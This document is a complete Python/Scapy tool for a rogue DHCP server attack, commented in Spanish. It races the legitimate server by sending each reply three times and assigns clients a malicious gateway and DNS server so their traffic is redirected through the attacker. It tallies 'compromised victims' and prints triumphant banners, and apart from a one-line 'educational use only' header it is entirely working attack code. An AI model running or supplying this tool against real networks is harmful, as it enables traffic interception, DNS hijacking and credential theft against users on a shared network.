### SOLO PARA USOS CONTROLADOS Y EDUCATIVOS.### SOLO PARA USOS CONTROLADOS Y EDUCATIVOS.

#!/usr/bin/env python3

from scapy.all import *
import sys
import argparse
import time
import os
import threading

class DHCPRogueServer:
    def __init__(self, interface, rogue_ip, rogue_gateway, rogue_dns, subnet_mask):
        self.interface = interface
        self.rogue_ip = rogue_ip
        self.rogue_gateway = rogue_gateway
        self.rogue_dns = rogue_dns
        self.subnet_mask = subnet_mask
        self.ip_pool_start = 200  # Empezar desde .200 para evitar conflictos
        self.current_ip = self.ip_pool_start
        self.leases = {}  # MAC -> IP asignada
        self.running = True
        
        # Extraer la red base (ej: "192.168.1" de "192.168.1.1")
        self.network_base = '.'.join(rogue_ip.split('.')[:-1])
        
    def get_next_ip(self):
        """Obtiene IP fuera del rango restringido (.1-.30)"""
        import random
        # USAR SOLO .31 en adelante (fuera del rango restringido)
        random_suffix = random.randint(31, 250)
        ip = f"{self.network_base}.{random_suffix}"
        return ip
    
    def send_dhcp_offer(self, discover_packet):
        """Responde a un DHCP DISCOVER con un DHCP OFFER malicioso"""
        try:
            # Extraer información del cliente
            client_mac = discover_packet[Ether].src
            client_xid = discover_packet[BOOTP].xid
            
            # Asignar IP NUEVA Y ALEATORIA cada vez para evitar conflictos NCB
            offered_ip = self.get_next_ip()
            self.leases[client_mac] = offered_ip
            
            # Construir DHCP OFFER malicioso
            ether = Ether(src=get_if_hwaddr(self.interface), dst=client_mac)
            ip = IP(src=self.rogue_ip, dst="255.255.255.255")
            udp = UDP(sport=67, dport=68)
            bootp = BOOTP(
                op=2,  # Boot Reply
                xid=client_xid,
                yiaddr=offered_ip,  # IP ofrecida al cliente
                siaddr=self.rogue_ip,  # IP del servidor (nosotros)
                chaddr=mac2str(client_mac)
            )
            dhcp = DHCP(options=[
                ("message-type", "offer"),
                ("server_id", self.rogue_ip),
                ("lease_time", 600),
                ("subnet_mask", self.subnet_mask),
                ("router", self.rogue_gateway),  # Gateway malicioso
                ("name_server", self.rogue_dns),  # DNS malicioso
                "end"
            ])
            
            packet = ether / ip / udp / bootp / dhcp
            sendp(packet, iface=self.interface, verbose=0)
            sendp(packet, iface=self.interface, verbose=0)  # Enviar 2 veces para ganar carrera
            sendp(packet, iface=self.interface, verbose=0)  # Triple envío = triple velocidad
            
            print(f"[OFFER] → {client_mac} | IP: {offered_ip} | GW: {self.rogue_gateway} | DNS: {self.rogue_dns}")
            
        except Exception as e:
            print(f"[!] Error enviando OFFER: {e}")
    
    def send_dhcp_ack(self, request_packet):
        """Responde a un DHCP REQUEST con un DHCP ACK malicioso"""
        try:
            # Extraer información del cliente
            client_mac = request_packet[Ether].src
            client_xid = request_packet[BOOTP].xid
            
            # Usar la IP ya asignada en el OFFER
            if client_mac in self.leases:
                acked_ip = self.leases[client_mac]
            else:
                # Si no existe, generar nueva (no debería pasar)
                acked_ip = self.get_next_ip()
                self.leases[client_mac] = acked_ip
            
            # Construir DHCP ACK malicioso
            ether = Ether(src=get_if_hwaddr(self.interface), dst=client_mac)
            ip = IP(src=self.rogue_ip, dst="255.255.255.255")
            udp = UDP(sport=67, dport=68)
            bootp = BOOTP(
                op=2,
                xid=client_xid,
                yiaddr=acked_ip,
                siaddr=self.rogue_ip,
                chaddr=mac2str(client_mac)
            )
            dhcp = DHCP(options=[
                ("message-type", "ack"),
                ("server_id", self.rogue_ip),
                ("lease_time", 600),
                ("subnet_mask", self.subnet_mask),
                ("router", self.rogue_gateway),
                ("name_server", self.rogue_dns),
                "end"
            ])
            
            packet = ether / ip / udp / bootp / dhcp
            sendp(packet, iface=self.interface, verbose=0)
            sendp(packet, iface=self.interface, verbose=0)  # Enviar 2 veces para ganar carrera
            sendp(packet, iface=self.interface, verbose=0)  # Triple envío = triple velocidad
            
            print(f"[ACK] ✓ {client_mac} | IP: {acked_ip} | COMPROMETIDO")
            
        except Exception as e:
            print(f"[!] Error enviando ACK: {e}")
    
    def packet_handler(self, pkt):
        """Maneja paquetes DHCP entrantes"""
        if DHCP in pkt:
            # Identificar tipo de mensaje
            dhcp_msg_type = None
            for opt in pkt[DHCP].options:
                if isinstance(opt, tuple) and opt[0] == 'message-type':
                    dhcp_msg_type = opt[1]
                    break
            
            # Responder según el tipo
            if dhcp_msg_type == 1:  # DISCOVER
                client_mac = pkt[Ether].src
                print(f"[DISCOVER] ← {client_mac}")
                # Responder inmediatamente con OFFER
                self.send_dhcp_offer(pkt)
                
            elif dhcp_msg_type == 3:  # REQUEST
                client_mac = pkt[Ether].src
                print(f"[REQUEST] ← {client_mac}")
                # Responder con ACK
                self.send_dhcp_ack(pkt)
    
    def start(self):
        """Inicia el servidor DHCP malicioso"""
        print(f"\n[*] Servidor DHCP Rogue activo en {self.interface}")
        print(f"[*] Servidor IP: {self.rogue_ip}")
        print(f"[*] Gateway malicioso: {self.rogue_gateway}")
        print(f"[*] DNS malicioso: {self.rogue_dns}")
        print(f"[*] Pool de IPs: {self.network_base}.{self.ip_pool_start} - {self.network_base}.250")
        print("-" * 60)
        print("[*] Esperando solicitudes DHCP...")
        print("[*] Presiona Ctrl+C para detener\n")
        
        try:
            sniff(
                iface=self.interface,
                filter="udp and (port 67 or port 68)",
                prn=self.packet_handler,
                store=0
            )
        except KeyboardInterrupt:
            print("\n[!] Servidor DHCP Rogue detenido")
            self.print_summary()
    
    def print_summary(self):
        """Imprime resumen de víctimas comprometidas"""
        print("\n" + "=" * 60)
        print("RESUMEN DE VÍCTIMAS COMPROMETIDAS")
        print("=" * 60)
        
        if self.leases:
            print(f"\nTotal de clientes envenenados: {len(self.leases)}\n")
            for mac, ip in self.leases.items():
                print(f"  MAC: {mac} → IP Asignada: {ip}")
        else:
            print("\nNo se comprometieron clientes.")
        
        print("=" * 60)

def main():
    parser = argparse.ArgumentParser(description='DHCP Rogue Server Attack')
    parser.add_argument('-i', '--interface', required=True, 
                        help='Interfaz de red (ej: eth0)')
    parser.add_argument('-s', '--server-ip', required=True,
                        help='IP del servidor DHCP rogue (ej: 192.168.1.50)')
    parser.add_argument('-g', '--gateway', required=True,
                        help='Gateway malicioso para asignar (ej: 192.168.1.50)')
    parser.add_argument('-d', '--dns', required=True,
                        help='DNS malicioso para asignar (ej: 192.168.1.50)')
    parser.add_argument('-m', '--netmask', default='255.255.255.0',
                        help='Máscara de subred (default: 255.255.255.0)')
    
    args = parser.parse_args()
    
    # Verificar root
    if os.geteuid() != 0:
        print("[!] Ejecuta con: sudo python3 dhcp_rogue.py")
        sys.exit(1)
    
    # I'M THE SERVER NOW
    print("\n")
    print("    ██╗███╗   ███╗    ████████╗██╗  ██╗███████╗")
    print("    ██║████╗ ████║    ╚══██╔══╝██║  ██║██╔════╝")
    print("    ██║██╔████╔██║       ██║   ███████║█████╗  ")
    print("    ██║██║╚██╔╝██║       ██║   ██╔══██║██╔══╝  ")
    print("    ██║██║ ╚═╝ ██║       ██║   ██║  ██║███████╗")
    print("    ╚═╝╚═╝     ╚═╝       ╚═╝   ╚═╝  ╚═╝╚══════╝")
    print("")
    print("    ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗ ")
    print("    ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗")
    print("    ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝")
    print("    ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗")
    print("    ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║")
    print("    ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝")
    print("")
    print("              ███╗   ██╗ ██████╗ ██╗    ██╗")
    print("              ████╗  ██║██╔═══██╗██║    ██║")
    print("              ██╔██╗ ██║██║   ██║██║ █╗ ██║")
    print("              ██║╚██╗██║██║   ██║██║███╗██║")
    print("              ██║ ╚████║╚██████╔╝╚███╔███╔╝")
    print("              ╚═╝  ╚═══╝ ╚═════╝  ╚══╝╚══╝ ")
    print("")
    time.sleep(1)
    
    # Crear e iniciar servidor rogue
    rogue_server = DHCPRogueServer(
        interface=args.interface,
        rogue_ip=args.server_ip,
        rogue_gateway=args.gateway,
        rogue_dns=args.dns,
        subnet_mask=args.netmask
    )
    
    rogue_server.start()
    
    # MISSION ACCOMPLISHED
    print("\n")
    print("    ═════════════════════════════════════════════════════")
    print("    ███╗   ███╗██╗███████╗███████╗██╗ ██████╗ ███╗   ██╗")
    print("    ████╗ ████║██║██╔════╝██╔════╝██║██╔═══██╗████╗  ██║")
    print("    ██╔████╔██║██║███████╗███████╗██║██║   ██║██╔██╗ ██║")
    print("    ██║╚██╔╝██║██║╚════██║╚════██║██║██║   ██║██║╚██╗██║")
    print("    ██║ ╚═╝ ██║██║███████║███████║██║╚██████╔╝██║ ╚████║")
    print("    ╚═╝     ╚═╝╚═╝╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝")
    print("")
    print("     █████╗  ██████╗ ██████╗ ██████╗ ███╗   ███╗██████╗ ")
    print("    ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗ ████║██╔══██╗")
    print("    ███████║██║     ██║     ██║   ██║██╔████╔██║██████╔╝")
    print("    ██╔══██║██║     ██║     ██║   ██║██║╚██╔╝██║██╔═══╝ ")
    print("    ██║  ██║╚██████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║██║     ")
    print("    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ")
    print("    ═════════════════════════════════════════════════════")
    print("\n")

if __name__ == "__main__":
    main()
